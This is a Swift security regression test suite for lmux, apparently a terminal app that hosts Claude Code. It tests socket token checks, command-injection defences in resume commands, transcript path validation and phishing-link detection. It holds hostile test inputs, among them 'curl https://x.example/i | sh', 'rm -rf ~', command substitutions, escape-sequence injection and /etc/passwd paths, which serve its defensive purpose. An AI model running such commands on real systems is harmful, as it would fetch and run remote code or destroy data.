import AppKit
import GhosttyKit
import LmuxHooks
import LmuxSessions
import LmuxTerminal
import LmuxTranscript
@testable import LmuxUI

// Security regressions (lmux-apptest --security): clipboard-read confirmation, pane tokens on the
// hook and control sockets, typed resume commands, transcript paths, the
// state dir, link labels and socket read caps. Headless; temp state dir; isolated pane shell.

@MainActor
func runSecurity() async -> Int32 {
    let r = Report()
    let c = makeController()
    // This run checks the default: no `lmux send` from outside a pane.
    c.allowExternalSendAtLaunch = false

    // ------------------------------------------------------------ OSC 52 read confirmation
    r.section = "clipboard"
    for req in [GHOSTTY_CLIPBOARD_REQUEST_OSC_52_READ, GHOSTTY_CLIPBOARD_REQUEST_KITTY_READ] {
        let a = GhosttyRuntime.clipboardConfirmation(request: req, text: "")
        r.check("a program reading the clipboard: Cancel is the default button (Return denies), Allow is not",
                a.buttons.count == 2 && a.buttons[0].title == "Allow" && a.buttons[0].keyEquivalent.isEmpty
                    && a.buttons[1].keyEquivalent == "\r")
    }
    let paste = GhosttyRuntime.clipboardConfirmation(request: GHOSTTY_CLIPBOARD_REQUEST_PASTE, text: "x")
    r.check("an unsafe paste the user started keeps Allow as the default", paste.buttons[0].keyEquivalent == "\r")

    // ------------------------------------------------------------ hook socket: pane tokens
    r.section = "hook-token"
    let ws1 = c.model.selected!, ws2 = c.newWorkspace(select: false)
    let p1 = ws1.panes[0], p2 = ws2.panes[0]
    _ = await sinks.waitReady(p1.id); _ = await sinks.waitReady(p2.id)
    let sid1 = "8e1f0c2a-0000-4000-8000-00000000a001", sid2 = "8e1f0c2a-0000-4000-8000-00000000a002"
    let tok1 = c.token(for: p1)!, tok2 = c.token(for: p2)!
    _ = sendHook(pane: p1.id, hook("UserPromptSubmit", session: sid1), token: "forged-\(tok1.prefix(8))")
    _ = sendHook(pane: p1.id, hook("UserPromptSubmit", session: sid1), token: tok2)
    let noToken = HookClient.envelope(pane: p1.id, payload: Array(hook("UserPromptSubmit", session: sid1).utf8), sentNanos: 0)!
    _ = HookClient.send(noToken, socketPath: paths.hookSocket)
    await sleepMs(300)
    r.check("hook events with a forged token, another pane's token, or none are dropped",
            p1.claudeSessionID == nil && p1.agent.state != .running, "\(p1.claudeSessionID ?? "nil") \(p1.agent.state)")
    _ = sendHook(pane: p1.id, hook("UserPromptSubmit", session: sid1), token: tok1)
    let accepted = await waitFor { p1.claudeSessionID == sid1 && p1.agent.state == .running }
    r.check("…the pane's own token is accepted", accepted)
    // The real lmux-hook, run by a pane's foreground process (as Claude Code runs it): it sends the
    // pane's LMUX_PANE_NONCE from its environment; with the token unset the same event changes nothing.
    if let hookBin = paths.hookBinary {
        func hookPane(_ name: String, session: String, dropToken: Bool) -> Pane {
            let script = paths.stateDir.appendingPathComponent("\(name).sh")
            let payload = hook("SessionStart", session: session, #""source":"startup""#)
            let run = dropToken ? "env -u LMUX_PANE_NONCE -u LMUX_PANE_TOKEN '\(hookBin)'" : "'\(hookBin)'"
            try? "#!/bin/sh\nprintf '%s' '\(payload)' | \(run)\nexec sleep 100000\n".write(to: script, atomically: true, encoding: .utf8)
            chmod(script.path, 0o755)
            return c.newWorkspace(select: false, program: script.path).panes[0]
        }
        let withTok = hookPane("hook-tok", session: sid2, dropToken: false)
        let bound = await waitFor(5) { withTok.claudeSessionID == sid2 }
        r.check("lmux-hook sends LMUX_PANE_NONCE with each event", bound, withTok.claudeSessionID ?? "nil")
        let sid3 = "8e1f0c2a-0000-4000-8000-00000000a003"
        let noTok = hookPane("hook-notok", session: sid3, dropToken: true)
        await sleepMs(1500)
        r.check("…and without it the same event changes nothing", noTok.claudeSessionID == nil, noTok.claudeSessionID ?? "nil")
        if let w = withTok.workspace { c.closeWorkspace(w) }
        if let w = noTok.workspace { c.closeWorkspace(w) }
    }

    // ------------------------------------------------------------ control socket: external send
    r.section = "control"
    let cli = paths.binDir!.appendingPathComponent("lmux").path
    let cliEnv = ["LMUX_CONTROL_SOCKET": paths.controlSocket, "LMUX_PANE_ID": "", "LMUX_PANE_NONCE": "", "LMUX_PANE_TOKEN": ""]
    let ext = await runProcess(cli, ["send", "--pane", p2.id, "outside"], env: cliEnv)
    await sleepMs(150)
    r.check("lmux send from outside a pane is refused by default", ext.status != 0 && ext.err.contains("allowExternalSend")
            && !sinks.text(p2.id).contains("outside"), ext.err)
    let forged = await runProcess(cli, ["send", "--pane", p2.id, "forgedtok"], env: cliEnv.merging(["LMUX_PANE_NONCE": "0123"]) { $1 })
    r.check("…a made-up token is no better", forged.status != 0 && !sinks.text(p2.id).contains("forgedtok"), forged.err)
    let own = await runProcess(cli, ["send", "--pane", p2.id, "ownpane"], env: cliEnv.merging(["LMUX_PANE_NONCE": tok2]) { $1 })
    let ownArrived = await sinks.wait(p2.id, contains: "ownpane")
    r.check("…a pane typing into itself still works", own.status == 0 && ownArrived, own.err)
    let n0 = c.model.workspaces.count
    let cmd = await runProcess(cli, ["new-workspace", "--cmd", "echo pwned"], env: cliEnv)
    r.check("new-workspace --cmd from outside is refused by default", cmd.status != 0 && c.model.workspaces.count == n0, cmd.err)
    let plain = await runProcess(cli, ["new-workspace"], env: cliEnv)
    r.check("…a plain new-workspace still works", plain.status == 0 && c.model.workspaces.count == n0 + 1, plain.err)
    c.allowExternalSendAtLaunch = true
    let optIn = await runProcess(cli, ["send", "--pane", p2.id, "optedin"], env: cliEnv)
    let optArrived = await sinks.wait(p2.id, contains: "optedin")
    r.check("…and LMUX_ALLOW_EXTERNAL_SEND=1 (or allowExternalSend) opts in", optIn.status == 0 && optArrived, optIn.err)
    c.allowExternalSendAtLaunch = false
    // Oversized request: the server drops the connection once 1 MB is read, without waiting for the end.
    let ctlPath = paths.controlSocket
    let ctlDropped = await Task.detached { oversizedDropped(ctlPath, bytes: 3 << 20) }.value
    r.check("a control request over 1 MB is dropped while it's still being sent", ctlDropped)
    // `lmux list`: titles and cwds come from programs; no control character reaches the terminal.
    let cwd0 = p2.cwd
    p2.cwd = "/tmp/\u{1b}]52;c;cHduZWQ=\u{07}x"
    let list = await runProcess(cli, ["list"], env: cliEnv)
    p2.cwd = cwd0
    r.check("lmux list strips control characters from titles and cwds", list.status == 0
            && !list.out.unicodeScalars.contains { $0.value == 0x1b || $0.value == 0x07 } && list.out.contains("/tmp/?]52"),
            list.out.debugDescription)

    // ------------------------------------------------------------ typed commands
    r.section = "resume"
    let u = "8e1f0c2a-0000-4000-8000-00000000b001"
    r.check("session ids must be UUIDs", ClaudeCommand.isSessionID(u) && !ClaudeCommand.isSessionID("x; rm -rf ~")
            && !ClaudeCommand.isSessionID(u + "\n") && !ClaudeCommand.isSessionID("fg-1"))
    r.check("restore: nothing for a non-UUID session, space-first for a UUID",
            LmuxController.resumeCommand("$(id)", saved: "claude --resume $(id)") == nil
                && LmuxController.resumeCommand(u, saved: "claude --model x --resume \(u)") == " claude --model x --resume \(u)\n")
    r.check("…a saved command with a control character falls back to plain resume",
            LmuxController.resumeCommand(u, saved: "claude --model 'a\u{1b}[2J' --resume \(u)") == " claude --resume \(u)\n")
    r.check("…a saved command is rebuilt from its words, never typed as is (operators, substitutions, prompts: plain resume)",
            LmuxController.resumeCommand(u, saved: "claude ; curl https://x.example/i | sh ; claude --resume \(u)") == " claude --resume \(u)\n"
                && LmuxController.resumeCommand(u, saved: "claude --model `id` --resume \(u)") == " claude --resume \(u)\n"
                && LmuxController.resumeCommand(u, saved: "claude 'do this' --resume \(u)") == " claude --resume \(u)\n"
                && LmuxController.resumeCommand(u, saved: "claude --model 'x'\\''y' --resume \(u)") == " claude --model 'x'\\''y' --resume \(u)\n",
            LmuxController.resumeCommand(u, saved: "claude --model 'x'\\''y' --resume \(u)") ?? "nil")
    let ctl = ClaudeCommand.resume(argv: ["claude", "--model", "x\u{1b}]0;t\u{07}"], sessionID: u)
    let ctlEnv = ClaudeCommand.resume(argv: ["claude", "--model", "x"], sessionID: u,
                                      environment: ["ANTHROPIC_MODEL": "m\u{9b}31m"], inherited: [:])
    r.check("argv or env with C0/C1 controls: only `claude --resume <uuid>`",
            ctl == "claude --resume \(u)" && ctlEnv == "claude --resume \(u)", ctl + " | " + ctlEnv)
    // fish reads \' and \\ inside '…' as escapes: quotes never contain either.
    let q = ClaudeCommand.shellQuote(#"a\'; echo pwned; '\"#)
    r.check("quoting holds in fish too: no backslash or quote inside single quotes",
            q == #"'a'\\''\''; echo pwned; '\'''\\''"#, q)
    let sh = await runProcess("/bin/sh", ["-c", "printf %s " + q])
    r.check("…and POSIX sh reads it back unchanged", sh.out == #"a\'; echo pwned; '\"#, sh.out)
    if FileManager.default.isExecutableFile(atPath: "/opt/homebrew/bin/fish") {
        let fish = await runProcess("/opt/homebrew/bin/fish", ["--no-config", "-c", "printf %s " + q])
        r.check("…and so does fish", fish.out == #"a\'; echo pwned; '\"#, fish.out)
    }

    // ------------------------------------------------------------ inline secrets in flags
    r.section = "resume-secrets"
    let inline = ClaudeCommand.resume(argv: ["claude", "--settings", #"{"env":{"ANTHROPIC_API_KEY":"sk-x"}}"#,
                                             "--mcp-config", "/a/m.json", #"{"mcpServers":{}}"#, "--system-prompt", "secret words",
                                             "--append-system-prompt=multi\nline", "--model", "x"], sessionID: u)
    r.check("inline JSON / text values of --settings, --mcp-config, --system-prompt, --append-system-prompt are dropped",
            inline == "claude --mcp-config /a/m.json --model x --resume \(u)", inline)
    let files = ClaudeCommand.resume(argv: ["claude", "--settings=./s.json", "--system-prompt", "prompts/p.md",
                                            "--append-system-prompt", "x.txt"], sessionID: u)
    r.check("…file paths are kept", files == "claude --settings=./s.json --system-prompt prompts/p.md --append-system-prompt x.txt --resume \(u)",
            files)

    // ------------------------------------------------------------ transcript paths
    r.section = "transcript-path"
    let root = paths.stateDir.appendingPathComponent("cfg/projects/-tmp-x", isDirectory: true)
    try? FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
    let good = root.appendingPathComponent("\(u).jsonl").path
    r.check("<config>/projects/<dir>/<uuid>.jsonl is a Claude transcript", TranscriptPath.isValid(good))
    let notOurs = ["/etc/passwd", root.appendingPathComponent("notes.jsonl").path,
                   paths.stateDir.appendingPathComponent("cfg/\(u).jsonl").path,
                   root.appendingPathComponent("../-tmp-x/\(u).jsonl").path, "relative/projects/x/\(u).jsonl"]
    r.check("…any other file is not", notOurs.allSatisfy { !TranscriptPath.isValid($0) })
    let link = root.appendingPathComponent("8e1f0c2a-0000-4000-8000-00000000b002.jsonl")
    try? FileManager.default.createSymbolicLink(atPath: link.path, withDestinationPath: "/etc/hosts")
    r.check("…nor a symlink with the right name", !TranscriptPath.isValid(link.path))

    // ------------------------------------------------------------ state dir
    r.section = "state-dir"
    let loose = paths.stateDir.appendingPathComponent("loose", isDirectory: true)
    try? FileManager.default.createDirectory(at: loose, withIntermediateDirectories: true)
    chmod(loose.path, 0o755)
    let lp = LmuxPaths(environment: ["LMUX_STATE_DIR": loose.path])
    r.check("a state dir of ours is accepted and made 0700", lp.secureStateDir() && PrivateFile.mode(of: loose.path) == 0o700)
    r.check("…one owned by another user (root) is refused", !LmuxPaths(environment: ["LMUX_STATE_DIR": "/usr"]).secureStateDir())
    let sockMode = PrivateFile.mode(of: paths.controlSocket) ?? 0, hookMode = PrivateFile.mode(of: paths.hookSocket) ?? 0
    r.check("both sockets are 0600", sockMode & 0o777 == 0o600 && hookMode & 0o777 == 0o600,
            String(sockMode, radix: 8) + " " + String(hookMode, radix: 8))

    // ------------------------------------------------------------ links
    r.section = "links"
    let fx = paths.stateDir.appendingPathComponent("links", isDirectory: true)
    try? FileManager.default.createDirectory(at: fx, withIntermediateDirectories: true)
    let exts = ["fileloc", "prefpane", "saver", "qlgenerator", "shortcut"]
    let notBlocked = exts.filter { ext in
        let f = fx.appendingPathComponent("x.\(ext)")
        try? Data("x".utf8).write(to: f)
        if case .deny(.unsafeFile) = UntrustedURL(f.absoluteString).decision { return false }
        return true
    }
    r.check("fileloc / prefpane / saver / qlgenerator / shortcut files are blocked", notBlocked.isEmpty, notBlocked.joined(separator: ","))
    r.check("a label that reads as another host is caught",
            UntrustedURL.misleadingLabel("paypal.com", target: URL(string: "https://paypal.com.evil.io/login")!) == "paypal.com"
                && UntrustedURL.misleadingLabel("https://github.com/x", target: URL(string: "https://evil.io")!) == "github.com")
    r.check("…but not the same host, a subdomain of it, plain words, or file names",
            UntrustedURL.misleadingLabel("github.com", target: URL(string: "https://www.github.com/a")!) == nil
                && UntrustedURL.misleadingLabel("github.com", target: URL(string: "https://gist.github.com/a")!) == nil
                && UntrustedURL.misleadingLabel("here", target: URL(string: "https://evil.io")!) == nil
                && UntrustedURL.misleadingLabel("README.md", target: URL(string: "https://evil.io")!) == nil)
    var prompts: [UntrustedURLPrompt] = []
    var opened: [URL] = []
    let open0 = GhosttyRuntime.openURL
    GhosttyRuntime.openURL = { opened.append($0) }
    UntrustedURLAlert.testHook = { prompts.append($0); return false }
    GhosttyRuntime.openTerminalURL("https://evil.io/x", kind: GHOSTTY_ACTION_OPEN_URL_KIND_OSC8, window: c.window, label: "bank.com")
    var asked = false
    if case .mismatch(_, _, let label)? = prompts.last { asked = label == "bank.com" }
    r.check("an OSC 8 link whose text reads as another host asks first (and Cancel opens nothing)", asked && opened.isEmpty)
    GhosttyRuntime.openTerminalURL("https://evil.io/x", kind: GHOSTTY_ACTION_OPEN_URL_KIND_OSC8, window: c.window, label: "evil.io")
    r.check("…a matching label opens directly", opened.count == 1 && prompts.count == 1)
    UntrustedURLAlert.testHook = nil
    GhosttyRuntime.openURL = open0

    // ------------------------------------------------------------ hook socket read cap
    r.section = "dos"
    let hookPath = paths.hookSocket
    let hookDropped = await Task.detached { oversizedDropped(hookPath, bytes: 24 << 20) }.value
    r.check("a hook line over 8 MB is dropped while it's still being sent", hookDropped)
    _ = sendHook(pane: p1.id, hook("Stop", session: sid1), token: tok1)
    let served = await waitFor { p1.agent.state != .running }
    r.check("…and the server keeps serving", served)
    return finish(r, c)
}

/// Writes `bytes` without a newline; true when the server closes the connection before all of it
/// was sent (EPIPE / reset), i.e. it enforces its cap per read instead of buffering everything.
func oversizedDropped(_ path: String, bytes: Int) -> Bool {
    var addr = sockaddr_un()
    addr.sun_family = sa_family_t(AF_UNIX)
    let pb = Array(path.utf8)
    guard pb.count < MemoryLayout.size(ofValue: addr.sun_path) else { return false }
    withUnsafeMutableBytes(of: &addr.sun_path) { $0.copyBytes(from: pb); $0[pb.count] = 0 }
    let fd = socket(AF_UNIX, SOCK_STREAM, 0)
    defer { close(fd) }
    var one: Int32 = 1
    setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, &one, socklen_t(MemoryLayout<Int32>.size))
    let rc = withUnsafePointer(to: &addr) {
        $0.withMemoryRebound(to: sockaddr.self, capacity: 1) { connect(fd, $0, socklen_t(MemoryLayout<sockaddr_un>.size)) }
    }
    guard rc == 0 else { return false }
    var tv = timeval(tv_sec: 5, tv_usec: 0)
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, socklen_t(MemoryLayout<timeval>.size))
    let block = [UInt8](repeating: UInt8(ascii: "a"), count: 64 * 1024)
    var sent = 0
    while sent < bytes {
        let n = block.withUnsafeBytes { write(fd, $0.baseAddress, $0.count) }
        if n <= 0 { return errno == EPIPE || errno == ECONNRESET }
        sent += n
    }
    return false
}
